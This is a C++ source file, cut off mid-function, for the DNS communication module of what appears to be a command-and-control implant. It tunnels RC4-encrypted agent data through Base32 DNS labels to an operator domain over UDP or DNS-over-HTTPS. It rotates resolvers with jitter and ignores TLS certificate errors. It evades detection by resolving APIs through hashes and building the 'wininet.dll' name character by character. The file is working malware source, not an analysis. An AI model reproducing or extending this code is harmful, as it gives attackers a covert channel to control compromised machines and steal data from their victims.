#include "ConnectorDNS.h"
#include "DnsCodec.h"
#include "Crypt.h"
#include "utils.h"
#include "ApiLoader.h"
#include "ProcLoader.h"
#include "Agent.h"

extern Agent* g_Agent;

static inline void WriteBE32(BYTE* dst, ULONG val) {
    dst[0] = (BYTE)(val >> 24);
    dst[1] = (BYTE)(val >> 16);
    dst[2] = (BYTE)(val >> 8);
    dst[3] = (BYTE)(val);
}

static inline ULONG ReadBE32(const BYTE* src) {
    return ((ULONG)src[0] << 24) | ((ULONG)src[1] << 16) | ((ULONG)src[2] << 8) | (ULONG)src[3];
}

static inline ULONG ReadLE32(const BYTE* src) {
    return (ULONG)src[0] | ((ULONG)src[1] << 8) | ((ULONG)src[2] << 16) | ((ULONG)src[3] << 24);
}

static USHORT ParseQtypeCode(const CHAR* qtypeStr) {
    if (!qtypeStr || !qtypeStr[0])
        return 16; // TXT default
    CHAR qt[8];
    memset(qt, 0, sizeof(qt));
    int qi = 0;
    while (qtypeStr[qi] && qi < (int)sizeof(qt) - 1) {
        CHAR c = qtypeStr[qi];
        if (c >= 'a' && c <= 'z')
            c = (CHAR)(c - 'a' + 'A');
        qt[qi++] = c;
    }
    qt[qi] = '\0';
    if (qt[0] == 'A' && qt[1] == '\0')
        return 1;
    if (qt[0] == 'A' && qt[1] == 'A' && qt[2] == 'A' && qt[3] == 'A' && qt[4] == '\0')
        return 28;
    return 16;
}

void* ConnectorDNS::operator new(size_t sz)
{
    void* p = MemAllocLocal(sz);
    return p;
}

void ConnectorDNS::operator delete(void* p) noexcept
{
    MemFreeLocal(&p, sizeof(ConnectorDNS));
}

ConnectorDNS::ConnectorDNS()
{
    this->functions = (DNSFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DNSFUNC));
    if (!this->functions)
        return;

    this->functions->LocalAlloc    = ApiWin->LocalAlloc;
    this->functions->LocalReAlloc  = ApiWin->LocalReAlloc;
    this->functions->LocalFree     = ApiWin->LocalFree;
    this->functions->WSAStartup    = ApiWin->WSAStartup;
    this->functions->WSACleanup    = ApiWin->WSACleanup;
    this->functions->socket        = ApiWin->socket;
    this->functions->closesocket   = ApiWin->closesocket;
    this->functions->sendto        = ApiWin->sendto;
    this->functions->recvfrom      = ApiWin->recvfrom;
    this->functions->select        = ApiWin->select;
    this->functions->gethostbyname = ApiWin->gethostbyname;
    this->functions->Sleep         = ApiWin->Sleep;
    this->functions->GetTickCount  = ApiWin->GetTickCount;
    this->functions->LoadLibraryA  = ApiWin->LoadLibraryA;
    this->functions->GetLastError  = ApiWin->GetLastError;

    this->dohFunctions = (DOHFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(DOHFUNC));
}

ConnectorDNS::~ConnectorDNS()
{
    CloseConnector();
    if (this->dohFunctions) {
        this->functions->LocalFree(this->dohFunctions);
        this->dohFunctions = NULL;
    }
    if (this->functions) {
        this->functions->LocalFree(this->functions);
        this->functions = NULL;
    }
}

// WSA initialization

BOOL ConnectorDNS::InitWSA()
{
    if (this->wsaInitialized)
        return TRUE;

    if (!this->functions || !this->functions->WSAStartup)
        return FALSE;

    WSADATA wsaData;
    if (this->functions->WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return FALSE;

    this->wsaInitialized = TRUE;

    if (!this->queryBuffer)
        this->queryBuffer = (BYTE*)MemAllocLocal(kQueryBufferSize);
    if (!this->respBuffer)
        this->respBuffer = (BYTE*)MemAllocLocal(kRespBufferSize);

    return TRUE;
}

void ConnectorDNS::CleanupWSA()
{
    if (this->cachedSocket != INVALID_SOCKET) {
        this->functions->closesocket(this->cachedSocket);
        this->cachedSocket = INVALID_SOCKET;
    }

    if (this->queryBuffer) {
        MemFreeLocal((LPVOID*)&this->queryBuffer, kQueryBufferSize);
        this->queryBuffer = NULL;
    }
    if (this->respBuffer) {
        MemFreeLocal((LPVOID*)&this->respBuffer, kRespBufferSize);
        this->respBuffer = NULL;
    }

    if (this->wsaInitialized && this->functions && this->functions->WSACleanup) {
        this->functions->WSACleanup();
        this->wsaInitialized = FALSE;
    }
}

BOOL ConnectorDNS::InitDoH()
{
    if (this->dohInitialized)
        return TRUE;

    if (!this->functions || !this->functions->LoadLibraryA || !this->dohFunctions)
        return FALSE;

    CHAR wininet_c[12];
    wininet_c[0] = 'w';
    wininet_c[1] = 'i';
    wininet_c[2] = 'n';
    wininet_c[3] = 'i';
    wininet_c[4] = 'n';
    wininet_c[5] = 'e';
    wininet_c[6] = 't';
    wininet_c[7] = '.';
    wininet_c[8] = 'd';
    wininet_c[9] = 'l';
    wininet_c[10] = 'l';
    wininet_c[11] = 0;

    HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
    if (!hWininetModule)
        return FALSE;

    this->dohFunctions->InternetOpenA              = (decltype(InternetOpenA)*)              GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
    this->dohFunctions->InternetConnectA           = (decltype(InternetConnectA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
    this->dohFunctions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
    this->dohFunctions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
    this->dohFunctions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)         GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
    this->dohFunctions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)       GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
    this->dohFunctions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)             GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
    this->dohFunctions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
    this->dohFunctions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)        GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
    this->dohFunctions->InternetReadFile           = (decltype(InternetReadFile)*)           GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);

    if (!this->dohFunctions->InternetOpenA || !this->dohFunctions->HttpSendRequestA)
        return FALSE;

    CHAR* userAgent = (CHAR*)this->profile.user_agent;
    this->hInternet = this->dohFunctions->InternetOpenA(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!this->hInternet)
        return FALSE;

    this->dohInitialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CleanupDoH()
{
    if (this->hInternet && this->dohFunctions && this->dohFunctions->InternetCloseHandle) {
        this->dohFunctions->InternetCloseHandle(this->hInternet);
        this->hInternet = NULL;
    }
    this->dohInitialized = FALSE;
}

SOCKET ConnectorDNS::GetSocket()
{
    if (this->cachedSocket != INVALID_SOCKET)
        return this->cachedSocket;

    if (!this->functions || !this->functions->socket)
        return INVALID_SOCKET;

    this->cachedSocket = this->functions->socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    return this->cachedSocket;
}

void ConnectorDNS::ReleaseSocket(SOCKET s, BOOL forceClose)
{
    if (s == INVALID_SOCKET)
        return;

    if (forceClose) {
        this->functions->closesocket(s);
        if (s == this->cachedSocket)
            this->cachedSocket = INVALID_SOCKET;
    }
}

// Resolver parsing

void ConnectorDNS::ParseResolvers(const CHAR* resolvers)
{
    this->resolverCount = 0;
    memset(this->rawResolvers, 0, sizeof(this->rawResolvers));
    for (ULONG i = 0; i < kMaxResolvers; ++i) {
        this->resolverList[i] = NULL;
        this->resolverFailCount[i] = 0;
        this->resolverDisabledUntil[i] = 0;
    }

    StrLCopyA(this->rawResolvers, resolvers, sizeof(this->rawResolvers));
    CHAR* p = this->rawResolvers;
    while (*p && this->resolverCount < kMaxResolvers) {
        while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
        if (!*p)
            break;
        this->resolverList[this->resolverCount++] = p;
        while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
        if (*p) *p++ = '\0';
    }
}

void ConnectorDNS::UpdateResolvers(BYTE* resolvers)
{
    this->profile.resolvers = resolvers;
    ParseResolvers((CHAR*)resolvers);
}

void ConnectorDNS::UpdateSleepDelay(ULONG sleepSeconds)
{
    this->sleepDelaySeconds = sleepSeconds;
}

void ConnectorDNS::ParseDohResolvers(const CHAR* dohResolvers)
{
    this->dohResolverCount = 0;
    memset(this->dohResolverList, 0, sizeof(this->dohResolverList));
    for (ULONG i = 0; i < kMaxResolvers; ++i) {
        this->dohResolverFailCount[i] = 0;
        this->dohResolverDisabledUntil[i] = 0;
    }

    if (!dohResolvers || !dohResolvers[0])
        return;

    CHAR tempBuf[1024];
    StrLCopyA(tempBuf, dohResolvers, sizeof(tempBuf));

    CHAR* p = tempBuf;
    while (*p && this->dohResolverCount < kMaxResolvers) {
        while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' || *p == '\r' || *p == '\n') ++p;
        if (!*p) break;

        CHAR* urlStart = p;
        while (*p && *p != ',' && *p != ';' && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') ++p;
        CHAR savedChar = *p;
        if (*p) *p = '\0';

        DohResolverInfo* info = &this->dohResolverList[this->dohResolverCount];
        info->port = 443;

        CHAR* hostStart = urlStart;
        if (hostStart[0] == 'h' && hostStart[1] == 't' && hostStart[2] == 't' && hostStart[3] == 'p') {
            hostStart += 4;
            if (*hostStart == 's') hostStart++;
            if (hostStart[0] == ':' && hostStart[1] == '/' && hostStart[2] == '/') {
                hostStart += 3;
            }
        }

        CHAR* pathStart = hostStart;
        while (*pathStart && *pathStart != '/' && *pathStart != ':') ++pathStart;

        if (*pathStart == ':') {
            *pathStart = '\0';
            StrLCopyA(info->host, hostStart, sizeof(info->host));
            pathStart++;
            info->port = 0;
            while (*pathStart >= '0' && *pathStart <= '9') {
                info->port = info->port * 10 + (*pathStart - '0');
                pathStart++;
            }
            if (info->port == 0)
                info->port = 443;
        }
        else {
            CHAR savedPath = *pathStart;
            *pathStart = '\0';
            StrLCopyA(info->host, hostStart, sizeof(info->host));
            *pathStart = savedPath;
        }

        if (*pathStart == '/')
            StrLCopyA(info->path, pathStart, sizeof(info->path));
        else
            StrLCopyA(info->path, "/dns-query", sizeof(info->path));

        if (info->host[0])
            this->dohResolverCount++;

        if (savedChar) {
            *p = savedChar;
            p++;
        }
    }
}

// DNS wire query building

BOOL ConnectorDNS::BuildDnsWireQuery(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outLen)
{
    if (!outBuf || outBufSize < 512 || !outLen)
        return FALSE;

    *outLen = 0;
    memset(outBuf, 0, outBufSize);

    USHORT id = (USHORT)(this->functions->GetTickCount() & 0xFFFF);
    outBuf[0] = (BYTE)(id >> 8);
    outBuf[1] = (BYTE)(id & 0xFF);
    outBuf[2] = 0x01;  // RD flag
    outBuf[3] = 0x00;
    outBuf[4] = 0x00;
    outBuf[5] = 0x01;  // QDCOUNT = 1
    outBuf[10] = 0x00;
    outBuf[11] = 0x01; // ARCOUNT = 1 (EDNS0)

    ULONG offset = 12;

    int nameLen = DnsCodec::EncodeName(qname, outBuf + offset, (int)(outBufSize - offset - 16));
    if (nameLen < 0)
        return FALSE;
    offset += nameLen;

    USHORT qtypeCode = ParseQtypeCode(qtypeStr);

    outBuf[offset++] = (BYTE)(qtypeCode >> 8);
    outBuf[offset++] = (BYTE)(qtypeCode & 0xFF);
    outBuf[offset++] = 0x00;
    outBuf[offset++] = 0x01;  // IN class

    if (offset + 11 > outBufSize)
        return FALSE;
    outBuf[offset++] = 0x00; // root
    outBuf[offset++] = 0x00; // TYPE OPT
    outBuf[offset++] = 41;
    outBuf[offset++] = 0x10; // CLASS = 4096
    outBuf[offset++] = 0x00;
    outBuf[offset++] = 0x00; // TTL
    outBuf[offset++] = 0x00;
    outBuf[offset++] = 0x00;
    outBuf[offset++] = 0x00;
    outBuf[offset++] = 0x00; // RDLEN
    outBuf[offset++] = 0x00;

    *outLen = offset;
    return TRUE;
}

// DNS wire response parsing

BOOL ConnectorDNS::ParseDnsWireResponse(BYTE* response, ULONG respLen, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    if (!response || respLen <= 12 || !outBuf)
        return FALSE;

    USHORT qtypeCode = ParseQtypeCode(qtypeStr);

    int qdcount = (response[4] << 8) | response[5];
    int ancount = (response[6] << 8) | response[7];
    int pos = 12;

    for (int qi = 0; qi < qdcount; ++qi) {
        while (pos < (int)respLen && response[pos] != 0) {
            if ((response[pos] & 0xC0) == 0xC0) {
                pos += 2;
                break;
            }
            pos += response[pos] + 1;
        }
        pos++;
        pos += 4;
    }

    ULONG written = 0;
    for (int ai = 0; ai < ancount; ++ai) {
        if (pos + 12 > (int)respLen)
            return FALSE;
        if ((response[pos] & 0xC0) == 0xC0)
            pos += 2;
        else {
            while (pos < (int)respLen && response[pos] != 0) {
                pos += response[pos] + 1;
            }
            pos++;
        }
        USHORT type = (response[pos] << 8) | response[pos + 1];
        pos += 2;
        pos += 2; // class
        pos += 4; // TTL
        USHORT rdlen = (response[pos] << 8) | response[pos + 1];
        pos += 2;
        if (pos + rdlen > (int)respLen)
            return FALSE;

        if (qtypeCode == 16 && type == 16 && rdlen > 0) {
            USHORT consumed = 0;
            ULONG txtWritten = 0;
            while (consumed < rdlen) {
                if (pos + consumed >= (int)respLen)
                    break;
                BYTE txtLen = response[pos + consumed];
                consumed++;
                if (consumed + txtLen > rdlen)
                    break;
                if (txtLen > 0 && txtWritten + txtLen <= outBufSize) {
                    memcpy(outBuf + txtWritten, response + pos + consumed, txtLen);
                    txtWritten += txtLen;
                }
                consumed += txtLen;
            }
            if (txtWritten > 0) {
                *outSize = txtWritten;
                return TRUE;
            }
        }
        else if (qtypeCode == 1 && type == 1 && rdlen >= 4) {
            if (written + 4 <= outBufSize) {
                memcpy(outBuf + written, response + pos, 4);
                written += 4;
            }
        }
        else if (qtypeCode == 28 && type == 28 && rdlen >= 16) {
            if (written + 16 <= outBufSize) {
                memcpy(outBuf + written, response + pos, 16);
                written += 16;
            }
        }
        pos += rdlen;
    }

    if ((qtypeCode == 1 || qtypeCode == 28) && written > 0) {
        *outSize = written;
        return TRUE;
    }

    return FALSE;
}

// Single DNS query (UDP)

BOOL ConnectorDNS::QuerySingle(const CHAR* qname, const CHAR* resolverIP, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    if (!this->functions || !this->functions->sendto || !this->functions->recvfrom)
        return FALSE;

    if (!InitWSA())
        return FALSE;

    SOCKET s = GetSocket();
    if (s == INVALID_SOCKET)
        return FALSE;

    const CHAR* resolver = resolverIP;

    HOSTENT* he = this->functions->gethostbyname(resolver);
    if (!he || !he->h_addr_list || !he->h_addr_list[0]) {
        ReleaseSocket(s, TRUE);
        return FALSE;
    }

    sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = _htons(53);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    BYTE* query = this->queryBuffer;
    ULONG queryBufSize = kQueryBufferSize;
    BYTE stackQuery[4096];
    if (!query) {
        query = stackQuery;
        queryBufSize = sizeof(stackQuery);
    }
    ULONG queryLen = 0;
    if (!BuildDnsWireQuery(qname, qtypeStr, query, queryBufSize, &queryLen)) {
        ReleaseSocket(s, TRUE);
        return FALSE;
    }

    int sent = this->functions->sendto(s, (const char*)query, queryLen, 0, (sockaddr*)&addr, sizeof(addr));
    if (sent != (int)queryLen) {
        ReleaseSocket(s, TRUE);
        return FALSE;
    }

    fd_set readfds;
    readfds.fd_count = 1;
    readfds.fd_array[0] = s;
    timeval timeout;
    timeout.tv_sec = kQueryTimeout;
    timeout.tv_usec = 0;

    int selResult = this->functions->select(0, &readfds, NULL, NULL, &timeout);
    if (selResult <= 0) {
        ReleaseSocket(s, TRUE);
        return FALSE;
    }

    BYTE* resp = this->respBuffer;
    ULONG respBufSize = kRespBufferSize;
    BYTE stackResp[4096];
    if (!resp) {
        resp = stackResp;
        respBufSize = sizeof(stackResp);
    }

    int addrLen = sizeof(addr);
    int recvLen = this->functions->recvfrom(s, (char*)resp, respBufSize, 0, (sockaddr*)&addr, &addrLen);

    ReleaseSocket(s, FALSE);

    if (recvLen <= 12)
        return FALSE;

    return ParseDnsWireResponse(resp, (ULONG)recvLen, qtypeStr, outBuf, outBufSize, outSize);
}

// DoH query

BOOL ConnectorDNS::QueryDoH(const CHAR* qname, const DohResolverInfo* resolver, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;
    if (!this->dohInitialized && !InitDoH())
        return FALSE;

    if (!resolver || !resolver->host[0] || !this->dohFunctions)
        return FALSE;

    BYTE dnsQuery[512];
    ULONG queryLen = 0;
    if (!BuildDnsWireQuery(qname, qtypeStr, dnsQuery, sizeof(dnsQuery), &queryLen))
        return FALSE;

    HINTERNET hConnect = this->dohFunctions->InternetConnectA(this->hInternet, resolver->host, resolver->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
        return FALSE;

    CHAR acceptTypes[] = "application/dns-message";
    LPCSTR rgpszAcceptTypes[] = { acceptTypes, NULL };
    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_SECURE;

    HINTERNET hRequest = this->dohFunctions->HttpOpenRequestA(hConnect, "POST", resolver->path, NULL, NULL, rgpszAcceptTypes, flags, 0);
    if (!hRequest) {
        this->dohFunctions->InternetCloseHandle(hConnect);
        return FALSE;
    }

    DWORD dwFlags;
    DWORD dwBuffer = sizeof(DWORD);
    if (this->dohFunctions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer)) {
        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
        this->dohFunctions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    CHAR headers[] = "Content-Type: application/dns-message\r\nAccept: application/dns-message\r\n";

    BOOL sendOk = this->dohFunctions->HttpSendRequestA(hRequest, headers, (DWORD)-1, (LPVOID)dnsQuery, queryLen);
    BOOL result = FALSE;
    if (sendOk) {
        CHAR statusCode[32];
        DWORD statusCodeLen = sizeof(statusCode);
        if (this->dohFunctions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLen, 0)) {
            int status = 0;
            for (int i = 0; statusCode[i] >= '0' && statusCode[i] <= '9'; i++) {
                status = status * 10 + (statusCode[i] - '0');
            }

            if (status == 200) {
                BYTE respBuf[4096];
                DWORD totalRead = 0;
                DWORD bytesRead = 0;
                DWORD bytesAvailable = 0;

                while (this->dohFunctions->InternetQueryDataAvailable(hRequest, &bytesAvailable, 0, 0) && bytesAvailable > 0) {
                    if (totalRead + bytesAvailable > sizeof(respBuf))
                        bytesAvailable = sizeof(respBuf) - totalRead;
                    if (bytesAvailable == 0)
                        break;

                    if (this->dohFunctions->InternetReadFile(hRequest, respBuf + totalRead, bytesAvailable, &bytesRead)) {
                        totalRead += bytesRead;
                        if (bytesRead == 0)
                            break;
                    }
                    else {
                        break;
                    }
                }

                if (totalRead > 12) {
                    result = ParseDnsWireResponse(respBuf, totalRead, qtypeStr, outBuf, outBufSize, outSize);
                }
            }
        }
    }

    this->dohFunctions->InternetCloseHandle(hRequest);
    this->dohFunctions->InternetCloseHandle(hConnect);

    return result;
}

// Resolver rotation

BOOL ConnectorDNS::QueryDoHWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;

    if (this->dohResolverCount == 0)
        return FALSE;

    for (ULONG i = 0; i < this->dohResolverCount; ++i) {
        ULONG idx = (this->currentDohResolverIndex + i) % this->dohResolverCount;
        DohResolverInfo* resolver = &this->dohResolverList[idx];
        if (!resolver->host[0]) continue;

        ULONG nowTick = this->functions->GetTickCount();
        if (this->dohResolverDisabledUntil[idx] && nowTick < this->dohResolverDisabledUntil[idx])
            continue;

        if (QueryDoH(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
            this->currentDohResolverIndex = idx;
            this->dohResolverFailCount[idx] = 0;
            this->dohResolverDisabledUntil[idx] = 0;
            return TRUE;
        }

        this->dohResolverFailCount[idx]++;

        if (this->dohResolverFailCount[idx] >= kMaxFailCount) {
            ULONG backoff = 30000;
            if (this->sleepDelaySeconds > 0) {
                ULONG b = this->sleepDelaySeconds * 2000;
                if (b < 5000) b = 5000;
                if (b > 30000) b = 30000;
                backoff = b;
            }
            ULONG currentTick = this->functions->GetTickCount();
            ULONG jitter = currentTick & 0x0FFF;
            this->dohResolverDisabledUntil[idx] = currentTick + backoff + jitter;
            this->dohResolverFailCount[idx] = 0;
        }
    }
    return FALSE;
}

BOOL ConnectorDNS::QueryUdpWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;

    if (this->resolverCount == 0)
        return FALSE;

    for (ULONG i = 0; i < this->resolverCount; ++i) {
        ULONG idx = (this->currentResolverIndex + i) % this->resolverCount;
        CHAR* resolver = this->resolverList[idx];
        if (!resolver || !*resolver)
            continue;

        ULONG nowTick = this->functions->GetTickCount();
        if (this->resolverDisabledUntil[idx] && nowTick < this->resolverDisabledUntil[idx])
            continue;

        if (QuerySingle(qname, resolver, qtypeStr, outBuf, outBufSize, outSize)) {
            this->currentResolverIndex = idx;
            this->resolverFailCount[idx] = 0;
            this->resolverDisabledUntil[idx] = 0;
            return TRUE;
        }

        this->resolverFailCount[idx]++;

        if (this->resolverFailCount[idx] >= kMaxFailCount) {
            ULONG backoff = 30000;
            if (this->sleepDelaySeconds > 0) {
                ULONG b = this->sleepDelaySeconds * 2000;
                if (b < 5000) b = 5000;
                if (b > 30000) b = 30000;
                backoff = b;
            }
            ULONG currentTick = this->functions->GetTickCount();
            ULONG jitter = currentTick & 0x0FFF;
            this->resolverDisabledUntil[idx] = currentTick + backoff + jitter;
            this->resolverFailCount[idx] = 0;
        }
    }
    return FALSE;
}

BOOL ConnectorDNS::QueryWithRotation(const CHAR* qname, const CHAR* qtypeStr, BYTE* outBuf, ULONG outBufSize, ULONG* outSize)
{
    *outSize = 0;

    switch (this->dnsMode) {
        case DNS_MODE_UDP:
            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);

        case DNS_MODE_DOH:
            return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);

        case DNS_MODE_UDP_FALLBACK:
            if (QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
                return TRUE;
            return QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);

        case DNS_MODE_DOH_FALLBACK:
            if (QueryDoHWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize))
                return TRUE;
            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);

        default:
            return QueryUdpWithRotation(qname, qtypeStr, outBuf, outBufSize, outSize);
    }
}

// Profile / lifecycle

BOOL ConnectorDNS::SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize)
{
    ProfileDNS profile = *(ProfileDNS*)profilePtr;
    this->profile = profile;
    this->sleepDelaySeconds = g_Agent ? g_Agent->config->sleep_delay : 0;

    ParseResolvers((CHAR*)profile.resolvers);

    ParseDohResolvers((CHAR*)profile.doh_resolvers);
    this->dnsMode = profile.dns_mode;

    if (!profile.encrypt_key)
        return FALSE;
    memset(this->encryptKey, 0, sizeof(this->encryptKey));
    memcpy(this->encryptKey, profile.encrypt_key, 16);

    this->pktSize = profile.pkt_size ? profile.pkt_size : kDefaultPktSize;
    if (this->pktSize > kMaxPktSize)
        this->pktSize = kMaxPktSize;

    this->labelSize = profile.label_size ? profile.label_size : kDefaultLabelSize;
    if (this->labelSize == 0 || this->labelSize > kMaxLabelSize)
        this->labelSize = kDefaultLabelSize;

    if (profile.domain)
        StrLCopyA(this->domain, (CHAR*)profile.domain, sizeof(this->domain));
    else
        this->domain[0] = 0;

    StrLCopyA(this->qtype, (CHAR*)"A", sizeof(this->qtype));

    if (!beat || !beatSize || beatSize < 8)
        return FALSE;

    // Extract agent ID from beat
    BYTE* beatCopy = (BYTE*)MemAllocLocal(beatSize);
    if (!beatCopy)
        return FALSE;
    memcpy(beatCopy, beat, beatSize);

    EncryptRC4(beatCopy, beatSize, this->encryptKey, 16);

    ULONG agentId = (beatSize >= 8) ? ReadBE32(beatCopy + 4) : 0;
    MemFreeLocal((LPVOID*)&beatCopy, beatSize);

    ApiWin->snprintf(this->sid, sizeof(this->sid), "%08x", agentId);

    // Store beat for HI message — decrypt to plaintext so we can compress it
    // (BuildBeat already RC4-encrypted the beat; we need plaintext for zlib compression)
    if (beat && beatSize) {
        this->hiBeat = (BYTE*)MemAllocLocal(beatSize);
        if (!this->hiBeat)
            return FALSE;
        memcpy(this->hiBeat, beat, beatSize);
        // RC4 is symmetric: encrypting again decrypts back to plaintext
        EncryptRC4(this->hiBeat, beatSize, this->encryptKey, 16);
        this->hiBeatSize = beatSize;
        this->hiSent = FALSE;
    }

    this->initialized = TRUE;
    return TRUE;
}

void ConnectorDNS::CloseConnector()
{
    CleanupWSA();
    CleanupDoH();

    if (this->recvData) {
        MemFreeLocal((LPVOID*)&this->recvData, (ULONG)this->recvSize);
        this->recvData = NULL;
        this->recvSize = 0;
    }
    if (this->hiBeat && this->hiBeatSize) {
        MemFreeLocal((LPVOID*)&this->hiBeat, this->hiBeatSize);
        this->hiBeat = NULL;
        this->hiBeatSize = 0;
    }
    if (this->downBuf && this->downTotal) {
        MemFreeLocal((LPVOID*)&this->downBuf, this->downTotal);
        this->downBuf = NULL;
        this->downTotal = 0;
    }
}

// Simplified framing — SendQuery

// SendQuery: encodes data as Base32 DNS labels and sends a single DNS query.
// Returns TRUE if the query was sent and a response was received.
// SendQuery: fire-and-forget DNS query (response discarded). Uses A qtype.
BOOL ConnectorDNS::SendQuery(const CHAR* op, BYTE* data, ULONG dataSize)
{
    CHAR dataLabel[1024];
    CHAR qname[512];

    if (!data || !dataSize)
        return FALSE;

    if (!DnsCodec::BuildDataLabels(data, dataSize, this->labelSize, dataLabel, sizeof(dataLabel)))
        return FALSE;

    DnsCodec::BuildQName(this->sid, op, ++this->seq, 0, dataLabel, this->domain, qname, sizeof(qname));

    BYTE resp[512];
    ULONG respSize = 0;
    return QueryWithRotation(qname, this->qtype, resp, sizeof(resp), &respSize);
}

// SendQueryTXT: DNS query with TXT qtype (for GET responses that need large payloads).
BOOL ConnectorDNS::SendQueryTXT(const CHAR* op, BYTE* data, ULONG dataSize, BYTE* respOut, ULONG respOutSize, ULONG* respSizeOut)
{
    CHAR dataLabel[1024];
    CHAR qname[512];

    *respSizeOut = 0;
    if (!data || !dataSize)
        return FALSE;

    if (!DnsCodec::BuildDataLabels(data, dataSize, this->labelSize, dataLabel, sizeof(dataLabel)))
        return FALSE;

    DnsCodec::BuildQName(this->sid, op, ++this->seq, 0, dataLabel, this->domain, qname, sizeof(qname));

    return QueryWithRotation(qname, "TXT", respOut, respOutSize, respSizeOut);
}

// SendQueryWithResp: DNS query with A qtype that captures the response.
BOOL ConnectorDNS::SendQueryWithResp(const CHAR* op, BYTE* data, ULONG dataSize, BYTE* respOut, ULONG respOutSize, ULONG* respSizeOut)
{
    CHAR dataLabel[1024];
    CHAR qname[512];

    *respSizeOut = 0;
    if (!data || !dataSize)
        return FALSE;

    if (!DnsCodec::BuildDataLabels(data, dataSize, this->labelSize, dataLabel, sizeof(dataLabel)))
        return FALSE;

    DnsCodec::BuildQName(this->sid, op, ++this->seq, 0, dataLabel, this->domain, qname, sizeof(qname));

    return QueryWithRotation(qname, this->qtype, respOut, respOutSize, respSizeOut);
}

// Download finalization

void ConnectorDNS::FinalizeDownload()
{
    if (!this->downBuf || this->downTotal == 0)
        return;

    this->lastDownTotal = this->downTotal;
    this->pendingDownAck = this->downTotal;
    this->pendingDownNonce = this->downTaskNonce;
    this->recvData = this->downBuf;
    this->recvSize = (int)this->downTotal;
    this->downBuf = NULL;
    this->downTotal = 0;
    this->downFilled = 0;
    this->hasPendingTasks = FALSE;
}

// Exchange — main loop integration

void ConnectorDNS::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
#ifdef BEACON_DNS
    if (g_Agent) {
        BYTE* dnsResolvers = g_Agent->config->profile.resolvers;
        if (dnsResolvers && dnsResolvers != (BYTE*)this->GetResolvers())
            this->UpdateResolvers(dnsResolvers);

        this->UpdateSleepDelay(g_Agent->config->sleep_delay);
        this->UpdateBurstConfig(g_Agent->config->profile.burst_enabled, g_Agent->config->profile.burst_sleep, g_Agent->config->profile.burst_jitter);
    }
#endif

    // 1: HI handshake
    if (!this->hiSent && this->hiBeat && this->hiBeatSize) {
        BYTE* compBuf = NULL;
        ULONG compLen = 0;
        DnsCodec::Compress(this->hiBeat, this->hiBeatSize, &compBuf, &compLen);

        BYTE* payload = this->hiBeat;
        ULONG payloadLen = this->hiBeatSize;
        if (compBuf && compLen > 0 && compLen < this->hiBeatSize) {
